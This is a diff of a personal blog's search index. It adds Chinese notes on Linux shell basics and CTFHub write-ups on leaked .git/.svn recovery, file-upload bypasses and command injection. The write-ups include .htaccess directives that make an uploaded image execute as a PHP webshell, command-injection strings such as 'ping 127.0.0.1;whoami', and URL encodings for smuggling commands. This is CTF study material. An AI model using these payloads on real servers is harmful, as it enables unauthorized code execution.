@@ -1,6 +1,438 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>linux基础</title>
+    <url>/2020/06/13/linux%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -F   &#x2F;&#x2F;更好显示格式</span><br><span class="line">ls -a   &#x2F;&#x2F;显示隐藏文件</span><br><span class="line">ls -l   &#x2F;&#x2F;查看文件各种选项</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat -n   &#x2F;&#x2F;显示行号</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep keyword des1 des2   &#x2F;&#x2F;在des1和des2里寻找keyword并且返回带有keyword的行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;dev -name filename -type d -print</span><br><span class="line">find &#x2F;dev -atime n  &#x2F;&#x2F;最后一次使用在n天前,+n表示大于n，-n表示小于n</span><br><span class="line">find &#x2F;dev -mtime n  &#x2F;&#x2F;最后一次修改在n天前</span><br></pre></td></tr></table></figure>
+
+<p>-type参数：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>b</td>
+<td>块文件设备</td>
+</tr>
+<tr>
+<td>c</td>
+<td>字符设备文件</td>
+</tr>
+<tr>
+<td>d</td>
+<td>目录文件</td>
+</tr>
+<tr>
+<td>f</td>
+<td>普通文件</td>
+</tr>
+<tr>
+<td>p</td>
+<td>命名管道</td>
+</tr>
+<tr>
+<td>l</td>
+<td>符号链接</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">locate xxx.doc   &#x2F;&#x2F;快速定位文件位置</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whereis find   &#x2F;&#x2F;查找程序</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">man find   &#x2F;&#x2F;寻求关于man的操作</span><br><span class="line">whatis find   &#x2F;&#x2F;寻求关于man的操作【简洁】</span><br><span class="line">apropos search   &#x2F;&#x2F;知道功能查找命令，比如像搜索东西时输入左边命令</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><h2 id="创建、移动、删除文件"><a href="#创建、移动、删除文件" class="headerlink" title="创建、移动、删除文件"></a>创建、移动、删除文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir</span><br><span class="line">mkdir -p ~&#x2F;abc&#x2F;999   &#x2F;&#x2F;-p使得可以创建子目录</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch hello   &#x2F;&#x2F;创建子文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv -i   &#x2F;&#x2F;提示是否覆盖原文件</span><br><span class="line">mv -b   &#x2F;&#x2F;在原文件后加个~</span><br><span class="line">cp -i</span><br><span class="line">cp -b   &#x2F;&#x2F;与mv同理</span><br><span class="line">cp -r test&#x2F; ~&#x2F;Desktop&#x2F;   &#x2F;&#x2F;将test子目录里所有内容移入目标位置</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -i   &#x2F;&#x2F;有提示，安全点</span><br><span class="line">rm -r   &#x2F;&#x2F;递归删除子目录下所有内容</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown abc:root hhh   &#x2F;&#x2F;将hhh文件的属主换为abc，属组换为root</span><br><span class="line">chown -R abc dir&#x2F;   &#x2F;&#x2F;将dir及其子目录下所有文件交给用户abc</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chgrp group hhh   &#x2F;&#x2F;将文件hhh的属组换为group</span><br></pre></td></tr></table></figure>
+
+<p>chmod：</p>
+<table>
+<thead>
+<tr>
+<th>u</th>
+<th>文件属主</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>g</td>
+<td>文件属组</td>
+</tr>
+<tr>
+<td>o</td>
+<td>其他人</td>
+</tr>
+<tr>
+<td>a</td>
+<td>所有人</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod u+x hhh   &#x2F;&#x2F;给hhh的文件属主增加执行权限</span><br><span class="line">chmod o&#x3D;r hhh   &#x2F;&#x2F;给其他人读hhh文件的权限</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>r</th>
+<th>4</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>w</td>
+<td>2</td>
+</tr>
+<tr>
+<td>x</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 761 hhh   &#x2F;&#x2F;给hhh赋予以下权限：属主rwx，属组rx，其他人x</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h2><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>文件类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>d</td>
+<td>目录</td>
+</tr>
+<tr>
+<td>c</td>
+<td>字符设备文件</td>
+</tr>
+<tr>
+<td>b</td>
+<td>块设备文件</td>
+</tr>
+<tr>
+<td>s</td>
+<td>本地域套接口</td>
+</tr>
+<tr>
+<td>p</td>
+<td>有名管道</td>
+</tr>
+<tr>
+<td>l</td>
+<td>符号链接</td>
+</tr>
+<tr>
+<td>-</td>
+<td>普通文件</td>
+</tr>
+</tbody></table>
+<p>字符设备文件（顺序访问设备）：指能从它那里读取成字符序列的设备。如磁带和串行线路。</p>
+<p>块设备（随机访问设备）：块设备指用来存储数据并对其各部分内容提供同等访问权的设备，如磁盘。</p>
+<h2 id="建立链接"><a href="#建立链接" class="headerlink" title="建立链接"></a>建立链接</h2><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;share&#x2F; 123   &#x2F;&#x2F;建立一个指向&#x2F;usr&#x2F;local&#x2F;share&#x2F;的符号链接123</span><br></pre></td></tr></table></figure>
+
+<p>软链接中，如果删除被指向的文件，连接将失去作用，但如果删除指向文件【123】，被指向的文件并无任何影响。</p>
+<h3 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln &#x2F;usr&#x2F;local&#x2F;share&#x2F; 123    &#x2F;&#x2F;建立一个硬链接</span><br></pre></td></tr></table></figure>
+
+<p>对于硬链接，相当于两个完全相同的文件，当年改变其中一个文件时，另一个文件也会随之改变</p>
+<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">date &gt; date_out   &#x2F;&#x2F;&gt;会覆盖原date_out文件</span><br><span class="line">ls ~&#x2F; &gt;&gt; lsF   &#x2F;&#x2F;&gt;&gt;会把结果加在原来lsF文件最后</span><br></pre></td></tr></table></figure>
+
+<h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat   &#x2F;&#x2F;每次打印用户的键盘输入，直到用户ctrl C</span><br><span class="line">cat &lt; lsF   &#x2F;&#x2F;将lsF作为输入参数传递给cat</span><br><span class="line">cat &lt;&lt; EOF   &#x2F;&#x2F;每次打印用户的键盘输入，直到遇到参数EOF</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command1 | command2   &#x2F;&#x2F;将command1的输出作为command2的输入</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="shell编程"><a href="#shell编程" class="headerlink" title="shell编程"></a>shell编程</h1><h2 id="几种特殊变量"><a href="#几种特殊变量" class="headerlink" title="几种特殊变量"></a>几种特殊变量</h2><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>文件名</td>
+</tr>
+<tr>
+<td>$1</td>
+<td>第一个参数名</td>
+</tr>
+<tr>
+<td>$#</td>
+<td>参数个数</td>
+</tr>
+<tr>
+<td>$*/$@</td>
+<td>包含参数列表【所有参数】，可用for遍历</td>
+</tr>
+</tbody></table>
+<h2 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h2><table>
+<thead>
+<tr>
+<th>“”</th>
+<th>阻止shell对大多数shell字符解释【如#】，但仍解释$、`、“等’’</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>‘’</td>
+<td>阻止解释所有字符</td>
+</tr>
+<tr>
+<td>``</td>
+<td>执行倒引号内的命令</td>
+</tr>
+</tbody></table>
+<h2 id="几种控制语句"><a href="#几种控制语句" class="headerlink" title="几种控制语句"></a>几种控制语句</h2><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if [ &quot;a&quot; &#x3D; &quot;b&quot; ]   &#x2F;&#x2F;空格！！！</span><br><span class="line">if test &quot;a&quot; &#x3D; &quot;b&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="比较方法"><a href="#比较方法" class="headerlink" title="比较方法"></a>比较方法</h3><h4 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h4><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-z str</td>
+<td>str长度为0返回真</td>
+</tr>
+<tr>
+<td>-n str</td>
+<td>str长度大于0返回真</td>
+</tr>
+<tr>
+<td>str1 = str2</td>
+<td>str1等于str2返回真</td>
+</tr>
+<tr>
+<td>str1 != str2</td>
+<td>str1不等于str2返回真</td>
+</tr>
+</tbody></table>
+<h4 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h4><p><img src="/2020/06/13/linux%E5%9F%BA%E7%A1%80/file.jpg" alt="file"></p>
+<h4 id="数字比较"><a href="#数字比较" class="headerlink" title="数字比较"></a>数字比较</h4><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-eq</td>
+<td>=</td>
+</tr>
+<tr>
+<td>-ne</td>
+<td>!=</td>
+</tr>
+<tr>
+<td>-lt</td>
+<td>&lt;</td>
+</tr>
+<tr>
+<td>-le</td>
+<td>&lt;=</td>
+</tr>
+<tr>
+<td>-gt</td>
+<td>&gt;</td>
+</tr>
+<tr>
+<td>-ge</td>
+<td>&gt;=</td>
+</tr>
+</tbody></table>
+<h4 id="复合表达式"><a href="#复合表达式" class="headerlink" title="复合表达式"></a>复合表达式</h4><table>
+<thead>
+<tr>
+<th>操作符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>!expr</td>
+<td>非</td>
+</tr>
+<tr>
+<td>expr1 -a expr2</td>
+<td>与</td>
+</tr>
+<tr>
+<td>expr1 -o expr2</td>
+<td>或</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>-a在expr1为假时就不会判断expr2</p>
+<p>-o在expr1为真时就不会判断expr2</p>
+</blockquote>
+<h3 id="几个具体例子"><a href="#几个具体例子" class="headerlink" title="几个具体例子"></a>几个具体例子</h3><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if test-commands-1</span><br><span class="line">then</span><br><span class="line">	commands-1</span><br><span class="line">elif test-commands-2</span><br><span class="line">then</span><br><span class="line">	commands-2</span><br><span class="line">else</span><br><span class="line">	commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<h4 id="case"><a href="#case" class="headerlink" title="case"></a>case</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case word in</span><br><span class="line">	pattern-1)</span><br><span class="line">		command-1</span><br><span class="line">		;;</span><br><span class="line">	pattern-2)</span><br><span class="line">		command-2</span><br><span class="line">		;;</span><br><span class="line">	...</span><br><span class="line">	pattern-n)    &#x2F;&#x2F;此步可用*)来代替default</span><br><span class="line">		command-n</span><br><span class="line">		;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
+
+<h4 id="while"><a href="#while" class="headerlink" title="while"></a>while</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while test-commands</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<h4 id="until-测试条件与while相反"><a href="#until-测试条件与while相反" class="headerlink" title="until[测试条件与while相反]"></a>until[测试条件与while相反]</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">until test-commands</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for variable [in list]</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="一些对shell编程有用的命令"><a href="#一些对shell编程有用的命令" class="headerlink" title="一些对shell编程有用的命令"></a>一些对shell编程有用的命令</h2><h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cut -c3-6 abc.txt   &#x2F;&#x2F;截取每一行第3-6字符</span><br><span class="line">cut -d&quot; &quot; -f2 abc.txt   &#x2F;&#x2F;以&quot; &quot;为分隔符，提取每一行的第二个字段</span><br></pre></td></tr></table></figure>
+
+<h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff file1 file2</span><br><span class="line">3c3</span><br><span class="line">4</span><br><span class="line">&lt; you are good</span><br><span class="line">----------------</span><br><span class="line">&gt; you are not </span><br><span class="line">&gt; hhh</span><br><span class="line"></span><br><span class="line">表示file1和file2第三行不同，file1是you are good，file2是you are not，file2多出第四行hhh</span><br></pre></td></tr></table></figure>
+
+<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sort -r -k2 abc.txt   &#x2F;&#x2F;按照第2个字段排序，-r代表倒序</span><br></pre></td></tr></table></figure>
+
+<h3 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sort abc.txt | uniq</span><br></pre></td></tr></table></figure>
+
+<p>uniq命令对排序过的文档，对其中重复的行进行去除</p>
+<h3 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tr &quot;ABH&quot; &quot;HCA&quot; &lt; abc.txt   &#x2F;&#x2F;将A转为H，将B转为C，将H转为A</span><br><span class="line">tr --delete &quot; &quot; &lt; abc.txt   &#x2F;&#x2F;删除所有空格</span><br></pre></td></tr></table></figure>
+
+<h3 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wc abc.txt</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-c</td>
+<td>显示字节数</td>
+</tr>
+<tr>
+<td>-l</td>
+<td>显示行数</td>
+</tr>
+<tr>
+<td>-w</td>
+<td>显示单词数</td>
+</tr>
+<tr>
+<td>-L</td>
+<td>显示最长一行长度</td>
+</tr>
+</tbody></table>
+<h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expr substr &quot;Hello World&quot; 1 5   &#x2F;&#x2F;截取第一个字节到第五个字节[expr不能丢，substr是shell、内建运算符而不是程序]</span><br><span class="line">&gt;&gt;Hello</span><br></pre></td></tr></table></figure>
+
+<h3 id="seq"><a href="#seq" class="headerlink" title="seq"></a>seq</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seq 9 -3 0   &#x2F;&#x2F;从9-0，步长为-3</span><br><span class="line">&gt;&gt;9</span><br><span class="line">&gt;&gt;6</span><br><span class="line">&gt;&gt;3</span><br><span class="line">&gt;&gt;0</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol>
+<li><pre><code>num1=1+2
+num2=$[ 1 + 2 ]
+echo $num1 $num2
+&gt;&gt; 1+2 3
+
+expr 1 + 2                     //空格不能少！！！
+&gt;&gt; 3
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
+8#26   //代表8进制的26
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3. 对变量第一次赋值时不需要$,引用它的时候就要加上$</span><br></pre></td></tr></table></figure>
+name=&quot;hhh&quot;
+echo &quot;I am $name&quot;
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">4. 赋值不要加空格，判断要加</span><br></pre></td></tr></table></figure>
+name=&quot;hhh&quot;   //赋值不要加
+if test &quot;$name&quot; = &quot;hhh&quot;   //判断要加空格
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">5. &amp;&amp;，||，-a，-o</span><br></pre></td></tr></table></figure>
+if [ expr1 ] &amp;&amp; [expr2]
+if [ expr1 -a expr2 ]</code></pre></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>泄露</title>
+    <url>/2020/06/02/git%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<h1 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h1><h2 id="log"><a href="#log" class="headerlink" title="log"></a>log</h2><p>先还是dirsearch扫一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;dirsearch.py -u &quot;http:&#x2F;&#x2F;challenge-14f2f8d51098f12f.sandbox.ctfhub.com:10080&#x2F;&quot; -e *</span><br></pre></td></tr></table></figure>
+
+<p>然后githack克隆一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http:&#x2F;&#x2F;challenge-885f3dc042d14377.sandbox.ctfhub.com:10080&#x2F;.git</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>git log可以查看日志 就是看看历史版本中都干了些什么</li>
+<li>git reset –-hard 版本号    就可以回到指定的版本 </li>
+</ul>
+</blockquote>
+<p><img src="/2020/06/02/git%E6%B3%84%E9%9C%B2/1.png" alt="1"></p>
+<p>我们现在是在“remove flag”版本，而flag应该是在add flag版本，所以以下有两种办法</p>
+<ul>
+<li><p>转到add flag版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset --hard 081a3f042a3b19429a61</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>比对两者的区别</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff 081a</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</li>
+</ul>
+<h2 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h2><p>关于<a href="https://jingyan.baidu.com/article/49ad8bceacac6b5834d8fa9a.html" target="_blank" rel="noopener">git stash</a></p>
+<p>前面几步都一样，直到Githack克隆到本地。</p>
+<p>然后用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pop</span><br></pre></td></tr></table></figure>
+
+<p>弹出堆栈里的flag</p>
+<h1 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h1><p>先用dirsearch扫描发现/.svn</p>
+<p>于是用dvcs-ripper里输入以下命令进行扫描</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;rip-svn.pl -v -u http:&#x2F;&#x2F;challenge-4410f020906ef0d6.sandbox.ctfhub.com:10080&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>扫描完输入命令【一定要有-a才能看到隐藏文件夹】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+
+<p>进入pristine文件夹寻找得到flag</p>
+<h1 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h1><p>这个工具出了点问题等调试好补上！</p>
+]]></content>
+      <tags>
+        <tag>ctfhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>备份文件下载</title>
     <url>/2020/06/01/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
     <content><![CDATA[<p>今天刷了ctfhub里的备份文件下载的四题，学到了一些东西，初步学会使用了dirsearch工具，这个东东我下在kali里了，在~/dirsearch里头使用命令：</p>
@@ -4719,17 +5151,30 @@ qVlRFz1v/9k=
 </blockquote>
 <h3 id="一些文件上传的绕过方法"><a href="#一些文件上传的绕过方法" class="headerlink" title="一些文件上传的绕过方法"></a>一些文件上传的绕过方法</h3><h4 id="黑名单文件类型"><a href="#黑名单文件类型" class="headerlink" title="黑名单文件类型"></a>黑名单文件类型</h4><p><img src="/2020/05/16/%E6%96%87%E4%BB%B6%E6%9C%89%E5%85%B3%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
 <p>这时可以使用bp抓包，把名字改一下即可绕过。比如在.php后加个空格、改个大小写、用php5、phtml此类扩展名。</p>
-<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>抓包修改content-type</p>
+<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>抓包修改content-type：<a href="https://www.fujieace.com/penetration-test/file-upload-mime.html" target="_blank" rel="noopener">相关内容。</a></p>
 <h4 id="JS验证"><a href="#JS验证" class="headerlink" title="JS验证"></a>JS验证</h4><ol>
 <li>可以进用JS</li>
 <li>可以f12查看源代码，然后把有关验证JS的链接给删除。</li>
 </ol>
 <h4 id="内容验证"><a href="#内容验证" class="headerlink" title="内容验证"></a>内容验证</h4><p>即后缀名可以随便修改，但是文件内容必须符合，比如要求文件格式为jpg。</p>
 <p>此时我们就可以把一句话隐写到php文件里，形成图片一句话，从而绕过验证。</p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断基本已经全部禁用</p>
-<h3 id="phar-zip协议"><a href="#phar-zip协议" class="headerlink" title="phar/zip协议"></a>phar/zip协议</h3><p>我们可能会遇到以下两种限制</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file) &amp;&amp; strtolower(substr($file, <span class="number">-4</span>)) == <span class="string">".jpg"</span>)&#123;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<p><a href="http://albatross-g.site/2020/01/11/%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%88%E5%B9%B6%E4%B8%8E%E5%88%86%E7%A6%BB/" target="_blank" rel="noopener">详情见我之前的文章。</a></p>
+<h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>这题是在ctfhub里刷到的一道比较新颖的题【我见识短浅】，来好好的记录一下啦。</p>
+<p>这道题参考了<a href="https://www.jianshu.com/p/c674904a711e" target="_blank" rel="noopener">这篇博客。</a></p>
+<blockquote>
+<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+</blockquote>
+<p>根据上面文档的总结，修改.htaccess文件大致上有两种方法：</p>
+<ul>
+<li><pre><code>AddType application/x-httpd-php .png   //png就是修改为的文件类型
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  将此文件命名为.htaccess上传即可</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+&lt;FilesMatch &quot;muma.php&quot;&gt;   
+//双引号里就是匹配的文件名，也就是一句话木马的文件名【没有.php好像也可以】
+    SetHandler application/x-httpd-php
+&lt;FilesMatch&gt;
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">二者选一上传之后再上传muma.png，这个配置文件就可以帮你把png改成php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 文件包含</span><br><span class="line"></span><br><span class="line">### %00截断</span><br><span class="line"></span><br><span class="line">%00截断基本已经全部禁用，可以参考[这篇](https:&#x2F;&#x2F;blog.csdn.net&#x2F;zpy1998zpy&#x2F;article&#x2F;details&#x2F;80545408)。</span><br><span class="line"></span><br><span class="line">### phar&#x2F;zip协议</span><br><span class="line"></span><br><span class="line">我们可能会遇到以下两种限制</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line"></span><br><span class="line">if(isset($file) &amp;&amp; strtolower(substr($file, -4)) &#x3D;&#x3D; &quot;.jpg&quot;)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</code></pre></li>
+</ul>
 <p>此时我们可以实行以下操作：</p>
 <ol>
 <li>创建一个1.php，里面写入php代码【phpinfo()】。</li>
@@ -5377,13 +5822,13 @@ qVlRFz1v/9k=
     <url>/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<h2 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
 <li><p><strong>command1 &amp; command2 ：</strong></p>
-<p>不管command1执行成功与否，都会执行command2（将上一个命令的输出作为下一个命令的输入）</p>
+<p>不管command1执行成功与否，都会执行command2</p>
 </li>
 <li><p><strong>command1 &amp;&amp; command2 ：</strong></p>
 <p>先执行command1执行成功后才会执行command2</p>
 </li>
 <li><p><strong>command1 | command2 ：</strong></p>
-<p>只执行command2</p>
+<p>只执行command2（将上一个命令的输出作为下一个命令的输入）</p>
 </li>
 <li><p><strong>command1 || command2 ：</strong></p>
 <p>command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</p>
@@ -5393,7 +5838,7 @@ qVlRFz1v/9k=
 <li><p>;   前面的执行完执行后面的    </p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1;whoami</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>|   管道符，显示后面的执行结果  </p>
+<li><p>|   管道符，显示后面的执行结果  ，（将上一个命令的输出作为下一个命令的输入）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1|whoami</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>||  当前面的执行出错时执行后面的  </p>
@@ -5410,14 +5855,68 @@ qVlRFz1v/9k=
 </li>
 </ul>
 <blockquote>
-<p><strong>常用url编码</strong> ：<br> %20 = 空格<br> %5c = <br> %26 = &amp;<br> %7c = |</p>
+<p><strong>常用url编码</strong> ：<br>%20 = 空格<br>%5c = <br>%26 = &amp;<br>%7c = |</p>
+<p>%0a=换行</p>
+<p>%3b=;</p>
 </blockquote>
 <h2 id="代码执行漏洞和命令执行漏洞"><a href="#代码执行漏洞和命令执行漏洞" class="headerlink" title="代码执行漏洞和命令执行漏洞"></a>代码执行漏洞和命令执行漏洞</h2><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>类似ecal(),assert()函数</p>
